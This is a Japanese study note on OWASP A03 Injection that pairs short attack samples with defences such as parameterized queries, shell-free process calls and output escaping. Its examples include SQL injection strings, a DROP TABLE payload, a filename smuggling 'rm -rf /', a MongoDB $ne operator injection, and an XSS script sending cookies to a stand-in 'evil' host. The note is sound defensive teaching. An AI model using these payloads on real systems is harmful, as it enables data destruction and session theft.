---
tags: [inbox, learning, security]
created: 2026-05-05
aliases:
  - A03
  - Injection
  - SQLi
  - SQLインジェクション
  - コマンドインジェクション
---

# A03 Injection

> [!summary]
> [[OWASP Top 10]] 2021年版で **3位**。攻撃者の入力が「データ」ではなく「コード／コマンド」として解釈されてしまう脆弱性カテゴリ。SQLi、OS Command Injection、LDAPi、NoSQLi、ORM Injection、テンプレートインジェクション、そして2021年から **XSS もここに統合** された。原則は単純（**コードとデータを分ける**）だが、実装の至るところに穴ができる。

## どういう脆弱性か

ユーザー入力が文字列連結でコマンド／クエリに混ぜ込まれ、構造を破壊して任意の挙動を引き起こす。代表的な種類：

- **SQL Injection** — DB操作
- **OS Command Injection** — シェル実行
- **LDAP Injection** — ディレクトリサービス検索
- **NoSQL Injection** — MongoDB等の演算子注入
- **ORM Injection** — ORMのraw queryやunsafe API
- **XSS** — ブラウザ上でJSが実行される（[[Web脆弱性の実装防御]]に詳細）
- **Template Injection** — Jinja2/EJS等のテンプレートエンジンに注入
- **Header Injection / CRLF Injection** — HTTPヘッダ／レスポンス分割

## 攻撃例

### SQL Injection の典型

```javascript
// 危険: 文字列連結
const query = `SELECT * FROM users WHERE email = '${email}'`

// 攻撃者の入力
email = "' OR '1'='1"

// 実行されるSQL
SELECT * FROM users WHERE email = '' OR '1'='1'
→ 全ユーザーが返る
```

`'; DROP TABLE users; --` で破壊的攻撃まで広がる（古典の "Bobby Tables"）。

### OS Command Injection

```javascript
// 危険
exec(`convert ${filename} output.png`)

// 攻撃者の入力
filename = "a.jpg; rm -rf /"
```

### NoSQL Injection（MongoDB）

```javascript
// 危険: req.body をそのまま渡す
db.users.findOne({ email: req.body.email, password: req.body.password })

// 攻撃者のリクエスト
{ "email": "a@b.com", "password": { "$ne": null } }
→ パスワード何でも一致
```

### XSS（A03に統合）

```html
<!-- 危険: 入力をそのままDOM挿入 -->
<div>{userInput}</div>

<!-- 攻撃者の入力 -->
<script>fetch('//evil/'+document.cookie)</script>
```

詳細は [[Web脆弱性の実装防御]] のXSSセクション参照。

## 防御策

### 1. パラメータ化クエリ（プリペアドステートメント）

**最重要かつ最効果的な対策**。文字列連結を捨てる：

```javascript
// 危険
db.query(`SELECT * FROM users WHERE id = ${userId}`)

// 安全（プレースホルダ）
db.query('SELECT * FROM users WHERE id = $1', [userId])

// ORM（基本的にエスケープしてくれる）
prisma.user.findUnique({ where: { id: userId } })
```

### 2. ORM の raw API には特に注意

ORMでも `$queryRawUnsafe`、`raw()`、`exec()` のような unsafe API は手動エスケープが必要。テンプレート文字列タグを使う安全なAPI（Prismaの `$queryRaw` のタグ付きテンプレート）を選ぶ。

### 3. OS コマンド実行を避ける

- ライブラリで完結できないか検討（画像変換なら `sharp`、ZIPなら `adm-zip` 等）
- どうしても必要なら **シェルを介さない API** を使う

```javascript
// 危険: シェル経由
exec(`tar -czf out.tgz ${dir}`)

// 安全: シェルなし、引数配列
spawn('tar', ['-czf', 'out.tgz', dir])
```

- 入力をホワイトリスト検証（英数字のみ等）

### 4. 出力時のコンテキスト別エスケープ（XSS対策）

HTML/属性/URL/JS/CSS で必要なエスケープが違う。React/Vue等のテンプレートは自動エスケープするが、`dangerouslySetInnerHTML` / `v-html` で穴が空く。

CSPを補助層として併用（[[Web脆弱性の実装防御]]）。

### 5. NoSQL は型を強制

```javascript
// Mongo: 入力は文字列のはず → 型で守る
const email = String(req.body.email)
const password = String(req.body.password)
```

スキーマバリデーション（zod、Joi、Pydantic）で型と形を入口で固める。

### 6. LDAP 特殊文字エスケープ

`( ) * \ NUL` などをエスケープ。ライブラリの安全APIを使う。

### 7. 入力検証は二次防御として

最重要は出力（クエリ／コマンド）側のエスケープだが、入力検証も併用。**allowlist（許可リスト）方式** を基本に、`denylist`（禁止リスト）に頼らない。

## 検出手段

- **[[SAST]]** — 文字列連結クエリ、`exec()` などの危険APIを静的解析
- **[[DAST]]** — 自動的にペイロードを送って応答差分から検知（sqlmap が有名）
- **コードレビュー** — raw query / shell 呼び出しの監査
- **WAF** — 一時しのぎ。エンコード回避でバイパスされうる

## 参考事例

- **British Airways (2018)** — Magecart によるカード情報スキミングはJS injection（XSS）経由
- **TalkTalk (2015)** — SQLi で 156,959 件の顧客情報流出、罰金 £400k
- **Sony Pictures (2011)** — SQLi で大規模流出
- **Equifax (2017)** — Apache Struts のテンプレート系脆弱性経由（[[A06]]も絡む）

## Next.js / Supabase での落とし穴

- **Supabase の `.rpc()`** — DB関数を呼ぶ際に SQL injection の可能性。関数内も安全に書く
- **テンプレートリテラルでクエリ組み立て** — Prisma `$queryRawUnsafe` は使わず `$queryRaw` のタグ付きテンプレートを使う
- **`dangerouslySetInnerHTML`** — 利用箇所を grep で監査、必ずサニタイズ（DOMPurify）

## 関連MOC

- [[MOC Security]]
- [[MOC DevSecOps]]
- [[MOC Learning]]

## 関連ノート

- [[OWASP Top 10]]
- [[Web脆弱性の実装防御]]
- [[SAST]]
- [[DAST]]
- [[OWASP API Security Top 10]]

## 出典

- [OWASP Top 10:2021 A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP Cheat Sheet: SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Cheat Sheet: OS Command Injection Defense](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [OWASP Cheat Sheet: Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
